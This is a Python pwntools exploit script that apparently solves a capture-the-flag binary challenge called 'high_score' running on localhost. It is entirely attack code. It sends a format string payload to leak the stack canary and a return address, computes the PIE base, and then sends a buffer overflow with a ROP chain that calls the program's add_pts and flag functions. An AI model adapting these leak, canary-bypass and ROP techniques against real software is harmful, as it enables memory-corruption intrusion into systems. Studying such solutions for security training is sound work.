from pwn import *


context.binary = elf = ELF('./high_score')
rop = ROP(elf)

# p = process('./high_score')
p = remote('localhost', 1455)

# Step 1: Navigate initial prompt
p.sendlineafter(b"Press Enter to Play Game\n", b"")
p.sendlineafter(b"Press Enter to Start\n", b"")

# Step 2: Leak PIE base and stack canary using format string vuln

fmt_payload = b"%13$p %15$p" #found canary and return address at these positons through testing
p.sendlineafter(b'> ', fmt_payload)

leak_line = p.recvline().decode()

# Extract leaked addresses (example: canary and return addr)
canary = int(leak_line.split()[0], 16)
ret_addr = int(leak_line.split()[1], 16)
# Calculate PIE base
ret_instr_offset_in_game = 0x109
pie_base = ret_addr - (elf.symbols['game'] + ret_instr_offset_in_game)
# Calculate absolute addresses of needed functions
add_pts = pie_base + elf.symbols['add_pts']
flag = pie_base + elf.symbols['flag']
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rdi_addr = pie_base + pop_rdi
ret_gadget = rop.find_gadget(['ret']).address
ret = ret_gadget + pie_base

# # Step 3: Build payload for buffer overflow
offset = 32 + 8
saved_rbp = 8
payload = b"A" * offset
payload += p64(canary)
payload += b"B" * saved_rbp
payload += p64(ret) # add for alignment
payload += p64(pop_rdi_addr)
payload += p64(500)      # argument to add_pts (increase score by 500)
payload += p64(add_pts)
payload += p64(ret) # add for alignment
payload += p64(flag)

# Step 4: Send payload to overwrite return address and call functions
p.sendlineafter(b"> ", payload)
output = p.recvall()
print(output)
